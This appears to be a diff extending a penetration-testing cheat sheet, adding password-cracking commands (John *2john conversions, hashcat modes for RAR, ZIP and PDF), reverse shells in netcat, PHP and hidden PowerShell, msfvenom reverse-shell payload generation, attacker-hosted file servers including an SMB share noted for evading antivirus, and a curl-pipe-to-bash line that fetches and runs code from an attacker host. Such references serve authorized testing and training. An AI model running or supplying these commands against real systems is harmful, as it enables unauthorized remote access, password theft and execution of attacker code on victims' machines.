@@ -92,10 +92,23 @@ john crackme --wordlist=words --format=Raw-MD5
 john --show hash.txt
 john --format=sha512crypt shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
+# John the Ripper - File Conversion to Hash (*2john)
+ssh2john id_rsa > ssh_hash.txt
+zip2john archive.zip > zip_hash.txt
+rar2john archive.rar > rar_hash.txt
+pdf2john document.pdf > pdf_hash.txt
+keepass2john database.kdbx > keepass_hash.txt
+office2john document.docx > office_hash.txt
+bitlocker2john -i backup.vhd > bitlocker_hash.txt
+putty2john putty.ppk > putty_hash.txt
+
 # Hashcat
 hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt           # MD5
 hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt        # sha512crypt
 hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt        # NTLM
+hashcat -m 13000 rar_hash.txt /usr/share/wordlists/rockyou.txt   # RAR5
+hashcat -m 13600 zip_hash.txt /usr/share/wordlists/rockyou.txt   # WinZip
+hashcat -m 10500 pdf_hash.txt /usr/share/wordlists/rockyou.txt   # PDF 1.4 - 1.6
 
 # Unshadow (combine passwd + shadow for John)
 unshadow <PASSWD-FILE> <SHADOW-FILE> > unshadowed.txt
@@ -121,6 +134,13 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.201 4444 >/tmp/f  
 
 # PHP Reverse Shell (one-liner)
 php -r '$sock=fsockopen("<IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Windows PowerShell Reverse Shell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Generating MSFVenom Payloads
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe
 
 # Upload full php reverse shell
 cp /usr/share/webshells/php/php-reverse-shell.php .    # Edit IP/port then upload
@@ -249,9 +269,16 @@ runas /savecred /user:admin cmd.exe
 # Python HTTP server (attacker)
 python3 -m http.server 9000
 
+# SMB Server (python impacket) - Good for Windows bypassing AV 
+impacket-smbserver shareName /path/to/share -smb2support
+
+# PHP Web Server
+php -S 0.0.0.0:9000
+
 # Wget / Curl (on victim)
 wget http://<ATTACKER-IP>:9000/file.sh
 curl http://<ATTACKER-IP>:9000/file.sh -o file.sh
+curl http://<ATTACKER-IP>:9000/file.sh | bash   # Execute directly in memory
 
 # SCP
 scp file.txt user@<IP>:/tmp/
